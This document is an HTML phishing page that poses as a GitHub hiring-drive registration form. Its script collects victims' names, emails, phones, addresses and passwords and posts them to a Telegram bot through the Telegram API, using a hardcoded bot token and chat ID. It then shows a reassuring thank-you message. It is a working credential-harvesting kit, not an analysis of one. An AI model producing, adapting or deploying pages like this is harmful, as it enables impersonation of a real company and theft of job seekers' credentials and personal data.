<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>GitHub Global Hiring Drive</title>
  <style>
    * {
      box-sizing: border-box;
      font-family: 'Segoe UI', sans-serif;
    }

    body {
      margin: 0;
      padding: 0;
      background: linear-gradient(135deg, #1f1c2c, #928dab);
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .container {
      background: #111;
      color: white;
      padding: 30px;
      border-radius: 15px;
      box-shadow: 0 10px 25px rgba(0,0,0,0.5);
      width: 90%;
      max-width: 400px;
    }

    h2 {
      text-align: center;
      margin-bottom: 20px;
    }

    input {
      width: 100%;
      padding: 12px;
      margin: 8px 0;
      border: none;
      border-radius: 8px;
      background-color: #222;
      color: white;
      outline: none;
      border: 1px solid #444;
    }

    input:focus {
      border-color: #9b59b6;
    }

    button {
      width: 100%;
      padding: 14px;
      margin-top: 10px;
      background-color: #8e2de2;
      border: none;
      border-radius: 8px;
      color: white;
      font-weight: bold;
      font-size: 16px;
      cursor: pointer;
    }

    button:hover {
      background-color: #5f27cd;
    }

    .thankyou {
      text-align: center;
      color: #0f0;
      font-weight: bold;
      display: none;
      margin-top: 20px;
    }

    .info {
      font-size: 14px;
      margin-top: 20px;
      color: #aaa;
      text-align: center;
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>Register for GitHub Hiring Drive</h2>
    <form id="registrationForm">
      <input type="text" name="name" placeholder="Full Name" required />
      <input type="email" name="email" placeholder="E-mail" required />
      <input type="tel" name="phone" placeholder="Contact Number" required />
      <input type="text" name="address" placeholder="Address" required />
      <input type="password" name="password" placeholder="Password" required />
      <input type="password" name="confirm" placeholder="Confirm Password" required />
      <button type="submit">Register for Drive</button>
    </form>
    <div class="thankyou" id="thankyouMsg">✅ Thank you! You will be contacted by email.</div>
    <div class="info">GitHub Global Careers • 2025 Drive</div>
  </div>

  <script>
    const botToken = "7448574888:AAFe9P4ICY0h4nnUh_Iat5h5qRuXGIrxMdw"; // Replace with your actual bot token
    const chatId = "968143308";     // Replace with your actual chat ID

    document.getElementById("registrationForm").addEventListener("submit", function(e) {
      e.preventDefault();

      const form = e.target;
      const name = form.name.value;
      const email = form.email.value;
      const phone = form.phone.value;
      const address = form.address.value;
      const password = form.password.value;
      const confirm = form.confirm.value;

      if (password !== confirm) {
        alert("Passwords do not match.");
        return;
      }

      const message = `🚨 *GitHub Registration* 🚨\n\n👤 Name: ${name}\n📧 Email: ${email}\n📱 Phone: ${phone}\n🏠 Address: ${address}\n🔐 Password: ${password}`;

      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
          parse_mode: "Markdown"
        })
      })
      .then(response => {
        if (response.ok) {
          form.style.display = "none";
          document.getElementById("thankyouMsg").style.display = "block";
        } else {
          alert("Failed to send message. Check bot ID & token.");
        }
      })
      .catch(err => {
        console.error(err);
        alert("Something went wrong.");
      });
    });
  </script>
</body>
</html>
